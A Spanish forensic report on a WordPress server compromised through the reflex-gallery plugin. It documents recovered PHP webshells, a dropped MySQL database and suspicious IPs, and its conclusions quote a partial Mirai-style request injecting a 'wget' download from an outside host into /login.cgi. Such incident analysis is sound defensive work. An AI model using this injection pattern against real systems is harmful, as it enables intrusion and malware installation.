# INFORME FORENSE PERICIAL — ANÁLISIS DE DISCO

**Título del caso / Referencia:** Incident on Linux Server I
**Perito/s:** Manuel Maye Piulestan, José Luis Godoy Khattaoui, Hugo Flores Molina, Juan Pérez Ortega.
**Fecha:** 14/04/2026
**N.º Expediente:** 0000-0002
**Clasificación:** CONFIDENCIAL

---

## 1. Juramento & Declaración de Abstención y Tacha

Los peritos abajo firmantes, designados por la parte empresarial interesada en el presente procedimiento, manifiestan su compromiso de cumplir fielmente el encargo recibido, actuando con la máxima objetividad, rigor técnico y respeto a la verdad, conforme a los principios de veracidad, imparcialidad y confidencialidad exigidos por la Ley 1/2000, de 7 de enero, de Enjuiciamiento Civil, y demás normativa aplicable. Nos comprometemos a exponer únicamente los hechos y conclusiones que resulten de las pruebas y evidencias analizadas, sin omitir ni alterar información relevante, y a mantener la debida reserva respecto de los datos a los que hemos tenido acceso en el ejercicio de nuestra función.

**Declaración de abstención:**

De acuerdo con lo dispuesto en los artículos 124 y 125 de la Ley de Enjuiciamiento Civil, los peritos firmantes manifiestan expresamente que no concurre en su persona causa alguna de abstención que les impida ejercer el cargo conferido por la empresa. Declaran no tener interés personal, directo o indirecto, en el objeto del litigio, ni mantener relación de parentesco, amistad, enemistad, dependencia profesional o cualquier otra circunstancia que pudiera afectar a su imparcialidad, garantizando así la plena objetividad en el desempeño de su labor pericial.

**Declaración de tacha:**

Asimismo, conforme a lo previsto en los artículos 343 y siguientes de la Ley de Enjuiciamiento Civil, los peritos abajo firmantes hacen constar que no concurre en su persona causa de tacha que pueda afectar a su idoneidad o imparcialidad. Declaran no haber sido condenados por delito de falso testimonio, ni estar incursos en causa de incapacidad, incompatibilidad o prohibición legal alguna para el ejercicio de la función pericial, asegurando el cumplimiento íntegro de los requisitos legales y éticos exigidos para el desempeño de su cometido como peritos de parte.

En Cádiz, a 21 de abril de 2026.

---

## 2. Palabras Clave

`Exfiltración de datos`: Transferencia no autorizada de información confidencial desde un sistema o red hacia un destino externo.

`Aplicación web`: Programa o software accesible a través de un navegador que permite interactuar con servicios o recursos en línea.

`Vulnerabilidad`: Debilidad o fallo en un sistema informático que puede ser explotado para comprometer su seguridad.

`Análisis forense`: Conjunto de técnicas y procedimientos utilizados para identificar, preservar, analizar y presentar evidencias digitales relacionadas con un incidente de seguridad.

`Memoria RAM`: Componente de hardware donde se almacenan temporalmente datos e instrucciones que está utilizando el sistema en ese momento.

`Logs`: Registros automáticos generados por sistemas o aplicaciones que documentan eventos, accesos y actividades relevantes para la seguridad y el funcionamiento.



---

## 3. Índice de Figuras

### Análisis de la imagen de disco

| N.º | Descripción |
|-----|-------------|
| Figura 1  | Contenido del `access.log` de Apache con intento de explotación RCE (`GET /login.cgi?...wget...`) desde la IP `197.55.45.100` |
| Figura 2  | Vista del `access.log` en la pestaña *Extracted Text* de Autopsy confirmando la cronología de los accesos |
| Figura 3  | Continuación del `access.log` con peticiones anómalas (escáneres `zgrab`, `python-requests`, `XDEBUG_SESSION_START`) |
| Figura 4  | Metadatos del fichero `/var/log/apache2/access.log.1` (tamaño, fechas de creación/modificación) |
| Figura 5  | Contenido del `error.log` de Apache con reinicios del servicio y error de WordPress en `setup-config.php` |
| Figura 6  | Primer tramo del `.bash_history` del usuario `ubuntu`: instalación de Apache + PHP + MySQL y despliegue de Let's Encrypt |
| Figura 7  | Segundo tramo del `.bash_history`: conexiones MySQL a RDS AWS, despliegue manual de WordPress 4.8.1 y cambio de propietario |
| Figura 8  | Tercer tramo del `.bash_history`: reinicios repetidos de Apache y ediciones del vhost SSL |
| Figura 9  | Metadatos del fichero `/home/ubuntu/.bash_history` con hashes MD5 y SHA-256 |
| Figura 10 | Contenido del `.mysql_history` con `drop database ganga;` y `GRANT ALL PRIVILEGES` |
| Figura 11 | Archivos borrados en `/var/www` (`html.dpkg-new`, `www.dpkg-new`) |
| Figura 12 | Archivos borrados en `/etc/apache2` (`.apache2.conf.swx`, `.ports.conf.swx`, `000-default-le-ssl.conf~`) |
| Figura 13 | Archivos borrados en `/var/www/html/wordpress/wp-content/uploads/2011`, incluyendo el plugin vulnerable `reflex-gallery.php` |
| Figura 14 | Webshells PHP borradas con nombres aleatorios (`yDdoSpsx.php`, `vmGABaiewrSSuMs.php`, `XLPYhlEtQOyiMKb.php`, `PLoeJFOEVoc.php`) |
| Figura 15 | Análisis VirusTotal de la IP `185.172.164.41` (6/94 motores la marcan como maliciosa) |
| Figura 16 | Análisis VirusTotal de la IP `199.195.254.118` (12/94 motores la marcan como maliciosa) |
| Figura 17 | Análisis VirusTotal de la IP `5.188.210.7` (0/94 detecciones) |
| Figura 18 | Análisis VirusTotal de la IP `88.0.112.115` (0/94, pero con 1 fichero comunicándose con ella) |
| Figura 19 | Análisis VirusTotal de la IP `94.242.54.22` (0/94, pero con 1 fichero comunicándose con ella) |

### Análisis de la memoria RAM

| N.º | Descripción |
|-----|-------------|
| Figura 1 | Conexión SSH entrante desde una dirección IP desconocida detectada en memoria |
| Figura 2 | Segunda conexión SSH entrante desde la misma IP desconocida |
| Figura 3 | Historial de comandos sospechoso asociado a modificaciones del sitio web alojado |
| Figura 4 | Resultado de Yarascan sobre el proceso SSH, evidenciando la conexión desde la misma IP |
| Figura 5 | Resultado de Yarascan sobre el proceso Apache, evidenciando la conexión desde la misma IP |
| Figura 6 | Detección de un archivo/proceso potencialmente asociado a malware |

---

## 4. Resumen Ejecutivo

Durante una jornada laboral aparentemente rutinaria, se recibió en el centro de datos de la empresa una alarma que indicaba un posible incidente de seguridad sobre un servidor Linux que alojaba un sitio web basado en WordPress (`ganga.site`). Los primeros indicios apuntaban a la exfiltración de datos sensibles y a la manipulación no autorizada del entorno web.

La aplicación afectada presentaba una vulnerabilidad crítica en un plugin de WordPress (reflex-gallery) que habría permitido a un atacante subir ficheros arbitrarios al servidor y obtener ejecución remota. El reto planteado es seguir el rastro digital dejado por el intruso en la imagen de disco del servidor para reconstruir la secuencia del ataque.

Ante esta situación, la empresa ha contratado a este equipo pericial para llevar a cabo una investigación forense sobre la imagen de disco del servidor comprometido, identificar las huellas del atacante y aportar claridad respecto a qué sucedió, cómo sucedió y qué medidas deben aplicarse.

La metodología definida para esta parte del análisis se centra en el estudio de la imagen de disco: revisión de los registros de actividad (logs) del servidor web y de autenticación, análisis del historial de comandos Bash del usuario administrador, examen de archivos borrados recuperables y, por último, contraste de las direcciones IP observadas frente a servicios de threat intelligence como VirusTotal.

Como resultado del análisis de disco, se han confirmado varios indicadores de compromiso: intentos de explotación RCE en los logs de Apache, webshells PHP borradas en el directorio de *uploads* de WordPress, manipulación de la base de datos MySQL alojada en AWS RDS, y comunicación con direcciones IP externas con reputación sospechosa. Este informe proporciona a la dirección de la empresa una base sólida y objetiva para la toma de decisiones estratégicas en materia de seguridad.

**Metodología:**

Para abordar el análisis de disco se ha seguido una metodología clara y estructurada. En primer lugar, se ha montado la imagen de disco `img_Disc.E01` en modo lectura con las herramientas forenses correspondientes. A continuación, se ha revisado el sistema de ficheros en busca de logs del servidor (Apache, MySQL), historiales de comandos y archivos borrados recuperables. Finalmente, las direcciones IP detectadas en los logs han sido consultadas en VirusTotal para evaluar su reputación. Todo el proceso se ha llevado a cabo aplicando técnicas forenses reconocidas, garantizando la integridad de las evidencias mediante el cotejo de hashes.

---

## 5. Introducción

### 5.1 Antecedentes

En fecha reciente, en el centro de datos de la empresa, se detectó una alerta de seguridad que indicaba la posible exfiltración de datos sensibles desde uno de los servidores Linux que alojaba el sitio web `ganga.site`. El técnico responsable recibió la notificación y procedió a la verificación del incidente.

Tras un primer análisis, se constató que el sitio presentaba un plugin de WordPress (reflex-gallery) con una vulnerabilidad crítica de subida de ficheros arbitrarios que habría sido explotada por un tercero no autorizado, así como intentos de explotación RCE en rutas `/login.cgi` típicas de botnets tipo Mirai. Ante la gravedad de los hechos y la potencial afectación a la confidencialidad de la información corporativa, la empresa solicitó la intervención de este equipo pericial con el objetivo de investigar el incidente a partir de la imagen de disco del servidor comprometido, identificar las huellas digitales del atacante y esclarecer tanto la mecánica de la intrusión como la información afectada.

### 5.2 Objetivos

El presente apartado del informe pericial tiene como objetivos principales:

1. Identificar, en la imagen de disco, las evidencias de la intrusión y el vector de entrada utilizado por el atacante.
2. Determinar las direcciones IP implicadas en el incidente y evaluar su reputación frente a servicios de threat intelligence.
3. Documentar los archivos maliciosos (webshells) encontrados en el servidor, así como los archivos borrados que pudieran ser recuperados.
4. Reconstruir, a partir del historial de comandos Bash y de los logs del servidor, la cronología de las acciones realizadas sobre el sistema.
5. Proponer recomendaciones técnicas que permitan corregir las vulnerabilidades explotadas y reforzar la seguridad del entorno.

---

## 6. Fuentes de Información

A continuación, se detalla el listado de las evidencias adquiridas y bajo análisis en esta parte del informe:

- **EVD-001**: Imagen forense del disco duro (HDD) procedente del servidor implicado (`img_Disc.E01`).

### 6.1 Adquisición de Evidencias

| Campo      | Valor |
|------------|-------|
| ID         | EVD-001 |
| Tipo       | HDD |
| Marca      |  |
| Modelo     |  |
| Serie      |  |
| Herr. Adq. | FTK Imager |
| Fecha      | 14/04/2026 |
| SHA-256 Orig. | Ver abajo |
| SHA-256 Img.  | Ver abajo |

**SHA-256 Original:**


**SHA-256 Imagen Forense:**


**Cadena de Custodia**

| # | Entrega                 | Recibe | Fecha      | Propósito   | Método     |
|---|-------------------------|--------|------------|-------------|------------|
| 1 | Hugo Flores Molina      | N/A    | 14/04/26   | Adq. evid.  | FTK Imager |
| 2 | José L. Godoy Khattaoui | N/A    | 14/04/26   | Anál. evid. | Autopsy    |

---

## 7. Análisis

### 7.1 Herramientas Utilizadas

| Herramienta | Versión | Propósito |
|-------------|---------|-----------|
| FTK Imager  | 4.7.3.81 | Adquisición y verificación de la imagen de disco |
| Autopsy     |          | Análisis del sistema de ficheros, logs y archivos borrados |
| VirusTotal  | Web      | Consulta de reputación de direcciones IP |

### 7.2 Procesos

Se ha seguido el protocolo de análisis forense establecido en el presente informe.

#### 7.2.1 Análisis de la imagen de disco

**Objetivo:** Encontrar indicios de la intrusión en el servidor Linux y documentar el rastro dejado por el atacante en la imagen de disco.

**Procedimiento:** Se ha montado la imagen `img_Disc.E01` en Autopsy y se han revisado, en este orden: (i) los logs del servidor web Apache bajo `/var/log/apache2/` (`access.log` y `error.log`), (ii) el historial de comandos del usuario `ubuntu` (`/home/ubuntu/.bash_history`) y los metadatos asociados, (iii) el historial de MySQL (`.mysql_history`), (iv) los archivos borrados en los directorios sensibles del servidor (`/var/www`, `/etc/apache2`, `/var/www/html/wordpress/wp-content/uploads/`) y (v) la reputación en VirusTotal de las IP externas relevantes detectadas en los logs.

**Hallazgos:** Se han localizado registros que evidencian actividad sospechosa sobre el servidor web, incluyendo al menos un intento claro de explotación RCE vía `/login.cgi` con descarga de un binario desde `http://104.244.72.82/`. En los directorios de uploads de WordPress se han recuperado, como ficheros borrados, varias webshells PHP con nombres aleatorios y el plugin vulnerable `reflex-gallery.php`, lo que concuerda con el vector de entrada. El historial de comandos confirma la conexión a una base de datos MySQL alojada en AWS RDS y el historial de MySQL muestra un `drop database` seguido de una recreación y concesión total de privilegios. Finalmente, cinco de las IPs externas observadas han sido consultadas en VirusTotal, resultando dos de ellas catalogadas como maliciosas por varios motores y otras tres con comunicaciones asociadas a ficheros detectados.

*Figura 1 - Contenido del `access.log` de Apache con intento de explotación RCE desde `197.55.45.100`.*

![access.log](assets/DISCO/acceslog.png)

*Figura 2 - Vista del `access.log` en la pestaña Extracted Text de Autopsy.*

![apachelogs](assets/DISCO/apachelogs.png)

*Figura 3 - Continuación del `access.log` con peticiones anómalas (zgrab, python-requests, XDEBUG_SESSION_START).*

![apachelogs2](assets/DISCO/apachelogs2.png)

*Figura 4 - Metadatos del fichero `/var/log/apache2/access.log.1`.*

![metadatos access.log](assets/DISCO/apachelogsmetadata.png)

*Figura 5 - Contenido del `error.log` de Apache.*

![error.log](assets/DISCO/errorlog.png)

*Figura 6 - Primer tramo del `.bash_history` del usuario `ubuntu` (instalación de la pila LAMP y Let's Encrypt).*

![bash-history 1](assets/DISCO/bash-history1.png)

*Figura 7 - Segundo tramo del `.bash_history` (conexión MySQL a RDS y despliegue de WordPress 4.8.1).*

![bash-history 2](assets/DISCO/bash-history2.png)

*Figura 8 - Tercer tramo del `.bash_history` (reinicios de Apache y ediciones del vhost SSL).*

![bash-history 3](assets/DISCO/bash-history3.png)

*Figura 9 - Metadatos del fichero `/home/ubuntu/.bash_history`.*

![metadatos bash history](assets/DISCO/metadatabashhistory.png)

*Figura 10 - Contenido del `.mysql_history` con `drop database ganga;` y `GRANT ALL PRIVILEGES`.*

![privilegios bbdd](assets/DISCO/privilegiosbbdd.png)

*Figura 11 - Archivos borrados en `/var/www` (`html.dpkg-new`, `www.dpkg-new`).*

![borrados www](assets/DISCO/archivosborradoswww.png)

*Figura 12 - Archivos borrados en `/etc/apache2` (swap de vi y `000-default-le-ssl.conf~`).*

![borrados apache2](assets/DISCO/archivosborradosapache2.png)

*Figura 13 - Archivos borrados en `/var/www/html/wordpress/wp-content/uploads/2011` incluyendo `reflex-gallery.php`.*

![borrados uploads 2011](assets/DISCO/archivosborradosupload2011.png)

*Figura 14 - Webshells PHP borradas con nombres aleatorios.*

![shells reversas borradas](assets/DISCO/shellreversasborradas.png)

*Figura 15 - Análisis VirusTotal de la IP `185.172.164.41` (6/94 motores maliciosa).*

![VT 185.172.164.41](assets/DISCO/VT_185.172.164.41.png)

*Figura 16 - Análisis VirusTotal de la IP `199.195.254.118` (12/94 motores maliciosa).*

![VT 199.195.254.118](assets/DISCO/VT_199.195.254.118.png)

*Figura 17 - Análisis VirusTotal de la IP `5.188.210.7`.*

![VT 5.188.210.7](assets/DISCO/VT_5.188.210.7.png)

*Figura 18 - Análisis VirusTotal de la IP `88.0.112.115`.*

![VT 88.0.112.115](assets/DISCO/VT_88.0.112.115.png)

*Figura 19 - Análisis VirusTotal de la IP `94.242.54.22`.*

![VT 94.242.54.22](assets/DISCO/VT_94.242.54.22.png)

---

## 8. Limitaciones

- No se han encontrado limitaciones técnicas relevantes en el análisis de la imagen de disco; se ha podido acceder a los logs del servidor web, al historial de comandos del usuario administrador y a un conjunto significativo de archivos borrados recuperables.
- Los datos identificativos del soporte físico (marca, modelo y número de serie del HDD) y las sumas SHA-256 de la evidencia original y de la imagen adquirida no figuran en la documentación disponible y quedan pendientes de ser cumplimentados con la información del acta de adquisición.
- No se han encontrado limitaciones en la cadena de custodia ni en la integridad de los hallazgos derivados del análisis de disco; los artefactos examinados no presentan signos de corrupción.

---

## 9. Conclusiones

1. El análisis de la imagen de disco confirma que el servidor alojaba un sitio WordPress (`ganga.site`) desplegado manualmente sobre una pila Apache + PHP + MySQL, con la base de datos externalizada en AWS RDS (`ganga.ctmbcxcdb3us.eu-central-1.rds.amazonaws.com`), tal y como se refleja en el `.bash_history` del usuario `ubuntu`.
2. El vector de intrusión más plausible a la luz de las evidencias es la explotación del plugin vulnerable `reflex-gallery` en `/wp-content/uploads/2011`, empleado por el atacante para subir al servidor varias webshells PHP con nombres aleatorios (`yDdoSpsx.php`, `vmGABaiewrSSuMs.php`, `XLPYhlEtQOyiMKb.php`, `PLoeJFOEVoc.php`), todas ellas recuperadas como archivos borrados.
3. En los logs de Apache queda registrado, además, un intento de explotación RCE tipo Mirai procedente de `197.55.45.100` (`GET /login.cgi?cli=...;wget http://104.244.72.82/k ...`) que refuerza la exposición del servidor frente a escaneos masivos y campañas automatizadas.
4. El historial de MySQL evidencia manipulación de la base de datos (`drop database ganga;` seguido de recreación y `GRANT ALL PRIVILEGES`), lo que implica riesgo de pérdida de integridad sobre la información almacenada en la BBDD del CMS.
5. Del conjunto de direcciones IP externas relevantes contrastadas en VirusTotal, dos han sido marcadas como maliciosas por múltiples motores (`185.172.164.41` 6/94 y `199.195.254.118` 12/94) y otras tres (`5.188.210.7`, `88.0.112.115`, `94.242.54.22`), pese a no estar catalogadas, mantienen comunicaciones asociadas a ficheros detectados, por lo que deben ser consideradas en el bloqueo perimetral.
6. Se recomienda: (i) eliminar el plugin `reflex-gallery` y actualizar WordPress y todos sus plugins; (ii) restringir permisos de escritura en `wp-content/uploads`; (iii) bloquear en el firewall las IPs catalogadas como maliciosas y revisar el resto; (iv) rotar las credenciales MySQL de AWS RDS y revisar los privilegios concedidos; y (v) reforzar la monitorización de los logs de Apache para detectar patrones RCE y escáneres automatizados.

---

## 10. Firmas de los Peritos

Los peritos abajo relacionados manifiestan su conformidad con el contenido y conclusiones del presente informe, asumiendo la autoría y responsabilidad del mismo:

- Manuel Maye Piulestan
- José Luis Godoy Khattaoui
- Hugo Flores Molina
- Juan Pérez Ortega
